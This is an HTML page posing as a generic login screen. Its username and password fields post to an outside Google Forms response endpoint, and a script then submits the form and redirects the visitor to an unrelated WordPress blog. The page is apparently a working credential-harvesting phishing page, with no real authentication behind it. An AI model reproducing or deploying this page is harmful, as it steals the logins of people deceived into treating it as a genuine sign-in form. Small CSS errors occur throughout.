<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {
	font-family: Arial, Helvetica, sans-serif;
	background-color: white;
}

*{
	box-sizing: border-box;
}

.container {
	position: relative;
	border-radius: 5px;
	background-color: #f2f2f2;
	padding: 20px 0 30px 0;
}

input,
.btn {
	width: 100%;
	padding: 12px;
	border: none;
	border-radius: 4px;
	margin: 5px 0;
	opacity: 0.85;
	display: inline-block;
	font-size: 17px;
	line-height: 20px;
	text-decoration: none;
}

input: hover,
.btn:hover {
	opacity: 1;
}

input[type=button] {
	background-color: navy;
	color: white;
	cursor: pointer;
}

input[type=button]:hover {
	background-color: lightgrey;
}

.col {
	float: center;
	width: 50%;
	margin: auto;
	padding: 0 50px;
	margin-top: 6px;
}

.row:after {
	content: "";
	display: table;
	clear: both;
}

.vl {
	position: absolute;
	left: 50%;
	transform; translate(-50%);
	border: 2px solid #ddd;
	height: 175px;
}

.vl-innertext {
	position: absolute;
	top: 50%;
	transform: translate(-50%, -50%);
	background-color: #f1f1f1;
	border: 1px solid #ccc;
`	border-radius: 50%;
	padding: 8px 10px;
}

.hide-md-lg {
	display: none;
}

.bottom-container {
	text-align: center;
	background-color: #666;
	border-radius: 0px 0px 4px 4px;
}

@media screen and (max-width: 650px) {
	.col {
		width: 100%;
		margin-top: 0;
	}
	.vl {
		display: none;
	}
	.hide-md-lg 2{
		display: block;
		text-align: center;
	}
}
</style>
</head>
<body>

	<center><h1>   </h1></center>

	<div class="container">
		<form id = "myForm" action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSeb9N8nHh2XIi1-Jo1KOF8vRElUMc90-TsS6t3X74FR3igg2g/formResponse" target="_self" method="POST">
			<div class="row">
				<h2 style="text-align:center">Login</h2>

				<div class="col">
					<div class="hide-md-lg2">
						<center><p> Sign in manually: </p></center>
					</div>

					<input type="text" name="entry.1040225934" placeholder="Username" required>
					<input type="password" name="entry.1974653250" placeholder="Password" required>
					<a href="file:///C:/Users/Dell/Desktop/Log%20in/p%20(86).jpg"><input type="button" onclick = "redirectTo()" value="Log in"></a>

				</div>

			</div>
		</form>
	</div>

<div class="bottom-container">
	<div class="row">
                      <div class= "col">
		<a href="#" style="color:white" class="btn"> Sign up </a>
	</div>
	<div class="col">
		<a href="#" style="color:white" class="btn"> Forgot password?</a>
	</div>
	</div>
</div>
v
</body>
<script>
function redirectTo() {
	document.getElementById("myForm").submit();
	window.location.replace("http://bdsmarticle.wordpress.com");
}
</script>
</html>
